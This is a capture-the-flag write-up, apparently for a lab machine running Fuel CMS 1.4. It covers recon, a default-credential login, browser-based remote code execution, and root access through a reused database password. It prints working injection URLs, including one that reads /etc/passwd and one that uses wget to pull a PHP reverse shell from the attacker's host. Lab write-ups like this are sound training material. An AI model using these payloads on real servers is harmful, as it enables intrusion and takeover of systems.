I started with a nmap scan to see what ports are open

```bash
sudo nmap -sC -sV -oN nmap/scan 10.10.161.118
```
# nmap results

```nmap
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

I ran gobuster in the background to see if I could find any hidden directories while manually visiting the web site

```bash
gobuster dir -u http://10.10.161.118 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,js -o gobuster.log
```

Visiting the index page displays that it is using fuel 1.4, also on the index page it says that you should
change the default login (admin:admin), I went to the 'fuel' directory which is the login portal for the fuel
cms and tried the default login credentials and was able to login

Using a exploit I found on exploitdb I was able to get code execution on the target machine 

# exploit

https://www.exploit-db.com/exploits/49487

I just used the browser instead of making it a script and running it 

# example of a code execution from the browser

```text
http://10.10.161.118/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('cat /etc/passwd')%2B%27
```

You will have to view the source code to see the output of the command that was ran

I tried to get it to run a reverse shell command (using nc and bash) and was unable to get a call back
to my machine, so I checked to see if the target machine had wget and it did, so I then made a test script 
to see if I could download the file to the server using wget and get it to run my code and it worked, 
so with that I can now make a reverse shell with php and set up a netcat listener and when I visit that page I 
should get a reverse shell

I was able to get a reverse shell with the method mentioned above

# wget command used in the url

```text
http://10.10.161.118/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('wget http://10.6.90.147:8000/shell.php -O /var/www/html/shell.php')%2B%27
```

Once inside of the target machine I was able to grab the user flag

Now to escalate to root

Digging around on the system I found a file called 'database.php' inside of /var/www/html/application/config, so I was 
thinking it had to be a configuration file and inside the file it had credentials for root to login to mysql database. So 
I figured what if he used the same password on the target machine

Using the same password that root uses to login to the database lets us escalate to the root user as well

And with that I was able to get the root flag
